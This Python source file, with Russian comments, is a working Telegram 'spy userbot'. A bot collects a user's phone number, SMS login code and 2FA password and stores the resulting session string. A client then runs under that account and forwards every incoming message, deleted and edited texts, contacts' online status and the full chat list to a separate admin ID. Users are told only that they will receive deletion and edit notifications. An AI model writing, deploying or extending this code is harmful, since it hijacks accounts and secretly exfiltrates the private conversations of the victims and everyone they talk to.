import asyncio
import sqlite3
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.utils import executor
import nest_asyncio
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
nest_asyncio.apply()

# ========== КОНФИГ ==========
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))  # Кому слать логи (твой Telegram ID)

# ========== БД ==========
conn = sqlite3.connect('userbot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT, chat_id INTEGER, chat_title TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS spy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, chat_id INTEGER, chat_title TEXT, user_id INTEGER, user_name TEXT, action TEXT, message TEXT)''')
conn.commit()

# ========== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ==========
active_clients = {}
saved_messages = {}
temp_auth = {}

# ========== БОТ ДЛЯ РЕГИСТРАЦИИ И УВЕДОМЛЕНИЙ ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

def log_to_admin(admin_id: int, text: str):
    """Отправляет лог админу через бота"""
    if admin_id:
        asyncio.create_task(bot.send_message(admin_id, text, parse_mode='HTML'))

def save_spy_log(owner_id, chat_id, chat_title, user_id, user_name, action, message):
    cursor.execute('''INSERT INTO spy_logs (timestamp, chat_id, chat_title, user_id, user_name, action, message) 
                      VALUES (?, ?, ?, ?, ?, ?, ?)''',
                   (datetime.now().isoformat(), chat_id, chat_title, user_id, user_name, action, message[:500]))
    conn.commit()

def get_code_keyboard():
    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"c_{i}"))
    kb.row(
        aiogram_types.InlineKeyboardButton("0", callback_data="c_0"),
        aiogram_types.InlineKeyboardButton("⌫", callback_data="c_del"),
        aiogram_types.InlineKeyboardButton("✅", callback_data="c_ok")
    )
    return kb

@dp.message_handler(commands=['start'])
async def start_auth(message: aiogram_types.Message):
    user_id = message.from_user.id
    
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row:
        await message.answer("✅ Ты уже авторизован! Юзербот активен.\n\nУведомления об удалении/изменении и логи чатов будут приходить сюда.")
        if user_id not in active_clients:
            asyncio.create_task(run_userbot(user_id, row[0]))
        return
    
    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь свой номер телефона для входа в твой аккаунт Telegram", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def get_phone(message: aiogram_types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {
            "client": client,
            "phone": phone,
            "hash": result.phone_code_hash,
            "code": ""
        }
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
        await message.answer("Используй кнопки", reply_markup=aiogram_types.ReplyKeyboardRemove())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('c_'))
async def code_callback(callback: aiogram_types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in temp_auth:
        await callback.answer("Начни заново /start")
        return
    
    action = callback.data[2:]
    current = temp_auth[user_id]["code"]
    
    if action == "del":
        temp_auth[user_id]["code"] = current[:-1]
    elif action == "ok":
        if len(current) == 5:
            await callback.answer("Авторизация...")
            await complete_auth(callback, user_id)
            return
        else:
            await callback.answer(f"Нужно 5 цифр (сейчас {len(current)})", show_alert=True)
            return
    else:
        if len(current) < 5:
            temp_auth[user_id]["code"] = current + action
    
    code = temp_auth[user_id]["code"]
    display = code if code else " "
    await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
    await callback.answer()

async def complete_auth(callback, user_id: int):
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["hash"])
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
        conn.commit()
        await callback.message.answer("✅ Авторизация успешна!\n\nТеперь юзербот следит за всеми чатами и присылает логи админу.")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        if "2FA" in str(e) or "password" in str(e).lower():
            await callback.message.answer("🔐 Введи пароль от 2FA:")
            temp_auth[user_id]["step"] = "2fa"
        else:
            await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
async def handle_2fa(message: aiogram_types.Message):
    user_id = message.from_user.id
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(password=message.text.strip())
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
        conn.commit()
        await message.answer("✅ Авторизация успешна!\n\nТеперь юзербот следит за всеми чатами.")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== ЮЗЕРБОТ-ШПИОН ==========

async def run_userbot(owner_id: int, session_string: str):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        logging.error(f"❌ {owner_id} не авторизован")
        return
    
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    logging.info(f"✅ Юзербот-шпион запущен для {owner_id}")
    
    # Отправляем админу что бот запущен
    log_to_admin(ADMIN_ID, f"🕵️ Шпион запущен!\nПользователь: {owner_id}\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Получаем все диалоги и отправляем админу
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            log_to_admin(ADMIN_ID, f"📱 В диалоге с: {dialog.name} (ID: {dialog.id})")
        elif dialog.is_group:
            log_to_admin(ADMIN_ID, f"👥 В группе: {dialog.name} (ID: {dialog.id})")
        elif dialog.is_channel:
            log_to_admin(ADMIN_ID, f"📢 В канале: {dialog.name} (ID: {dialog.id})")
    
    # Загружаем мут-лист
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    # ========== 1. ЛОГИРОВАНИЕ ВСЕХ СООБЩЕНИЙ ==========
    @client.on(events.NewMessage)
    async def spy_on_messages(event):
        # Не логируем свои сообщения
        if event.out:
            return
        
        chat = await event.get_chat()
        sender = await event.get_sender()
        
        chat_id = event.chat_id
        chat_title = getattr(chat, 'title', getattr(chat, 'first_name', str(chat_id)))
        sender_id = event.sender_id
        sender_name = getattr(sender, 'first_name', getattr(sender, 'title', 'Неизвестный'))
        message_text = event.text or "[Нет текста]"
        
        # Сохраняем в БД
        cursor.execute('''INSERT INTO spy_logs (timestamp, chat_id, chat_title, user_id, user_name, action, message)
                          VALUES (?, ?, ?, ?, ?, ?, ?)''',
                       (datetime.now().isoformat(), chat_id, chat_title[:100], sender_id, sender_name[:100], 
                        'new_message', message_text[:500]))
        conn.commit()
        
        # Отправляем админу
        log_msg = f"""
🕵️ <b>НОВОЕ СООБЩЕНИЕ</b>
━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%H:%M:%S')}
💬 <b>Чат:</b> {chat_title[:50]}
👤 <b>От:</b> {sender_name[:50]}
📝 <b>Текст:</b> {message_text[:300]}
━━━━━━━━━━━━━━━
"""
        log_to_admin(ADMIN_ID, log_msg)
        
        # Сохраняем для отслеживания удалений/изменений
        saved_messages[owner_id][event.id] = {
            "sender_id": sender_id,
            "text": message_text,
            "chat_id": chat_id,
            "chat_title": chat_title
        }
    
    # ========== 2. ОТСЛЕЖИВАНИЕ ВХОДА/ВЫХОДА ПОЛЬЗОВАТЕЛЕЙ ==========
    @client.on(events.UserUpdate)
    async def on_user_update(event):
        if hasattr(event, 'user') and hasattr(event.user, 'status'):
            try:
                user = event.user
                user_name = getattr(user, 'first_name', str(user.id))
                
                from telethon.tl.types import UserStatusOnline, UserStatusOffline
                
                if isinstance(user.status, UserStatusOnline):
                    log_to_admin(ADMIN_ID, f"🟢 <b>{user_name}</b> ВОШЕЛ В СЕТЬ!")
                elif isinstance(user.status, UserStatusOffline):
                    log_to_admin(ADMIN_ID, f"⚫ <b>{user_name}</b> ВЫШЕЛ ИЗ СЕТИ")
            except:
                pass
    
    # ========== 3. ОТСЛЕЖИВАНИЕ НОВЫХ ЧАТОВ ==========
    already_logged_chats = set()
    
    async def log_all_chats():
        while True:
            try:
                async for dialog in client.iter_dialogs():
                    if dialog.id not in already_logged_chats:
                        already_logged_chats.add(dialog.id)
                        chat_type = "📱 Диалог" if dialog.is_user else "👥 Группа" if dialog.is_group else "📢 Канал"
                        log_to_admin(ADMIN_ID, f"{chat_type}: {dialog.name} (ID: {dialog.id})")
            except:
                pass
            await asyncio.sleep(60)  # Проверяем новые чаты раз в минуту
    
    asyncio.create_task(log_all_chats())
    
    # ========== 4. УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ ==========
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        for msg_id in event.deleted_ids:
            msg = saved_messages.get(owner_id, {}).get(msg_id)
            if msg and msg["sender_id"] != owner_id:
                log_to_admin(ADMIN_ID, f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ</b>\nОт: {msg['sender_id']}\nТекст: {msg['text'][:200]}")
    
    # ========== 5. УВЕДОМЛЕНИЯ ОБ ИЗМЕНЕНИИ ==========
    @client.on(events.MessageEdited)
    async def on_edit(event):
        if event.out:
            return
        
        msg_id = event.id
        new_text = event.text or ""
        
        msg = saved_messages.get(owner_id, {}).get(msg_id)
        if msg and msg["text"] != new_text:
            log_to_admin(ADMIN_ID, f"✏️ <b>ИЗМЕНЕНО СООБЩЕНИЕ</b>\nБыло: {msg['text'][:200]}\nСтало: {new_text[:200]}")
            msg["text"] = new_text
    
    # ========== 6. КОМАНДЫ ==========
    @client.on(events.NewMessage)
    async def commands(event):
        if not event.is_private:
            return
        if not event.out:
            return
        
        text = event.text or ""
        if not text.startswith('.'):
            return
        
        if text == '.help':
            await event.edit("""<b>🕵️ ЮЗЕРБОТ-ШПИОН</b>

<i>Команды в личных сообщениях:</i>

<blockquote>
<b>.help</b> - эта справка
<b>.mute</b> (ответ) - заглушить пользователя
<b>.unmute</b> (ответ) - разглушить
<b>.list</b> - список замьюченных
<b>.stats</b> - статистика шпионажа
<b>.logchats</b> - выгрузить все чаты
</blockquote>

<i>Все логи уходят админу автоматически</i>""", parse_mode='HTML')
            return
        
        if text == '.stats':
            cursor.execute('SELECT COUNT(*) FROM spy_logs WHERE owner_id=?', (owner_id,))
            total_logs = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(DISTINCT chat_id) FROM spy_logs WHERE owner_id=?', (owner_id,))
            total_chats = cursor.fetchone()[0]
            await event.edit(f"📊 СТАТИСТИКА ШПИОНАЖА\n\nВсего логов: {total_logs}\nЧатов отслеживается: {total_chats}")
            return
        
        if text == '.logchats':
            chats = []
            async for dialog in client.iter_dialogs():
                chat_type = "Диалог" if dialog.is_user else "Группа" if dialog.is_group else "Канал"
                chats.append(f"{chat_type}: {dialog.name}")
            await event.edit("📋 ВСЕ ЧАТЫ:\n" + "\n".join(chats[:30]))
            return
        
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id and reply.sender_id != owner_id:
                cursor.execute('INSERT OR IGNORE INTO muted_users VALUES (?, ?)', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.add(reply.sender_id)
                await event.edit(f'🔕 Заглушен')
            return
        
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.discard(reply.sender_id)
                await event.edit(f'🔔 Разглушен')
            return
        
        if text == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔕 Замьюченные:\n" + "\n".join(names))
            else:
                await event.edit("🔕 Нет")
            return
    
    await client.run_until_disconnected()

# ========== ВЕБ-СЕРВЕР ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "🕵️ SpyBot Online"

def run_web():
    flask_app.run(host='0.0.0.0', port=8080)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for user_id, session_str in cursor.fetchall():
        asyncio.create_task(run_userbot(user_id, session_str))

async def main():
    logging.info("🚀 Шпион запускается...")
    await restore_sessions()
    while True:
        await asyncio.sleep(10)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    Thread(target=lambda: executor.start_polling(dp, skip_updates=True), daemon=True).start()
    asyncio.run(main())
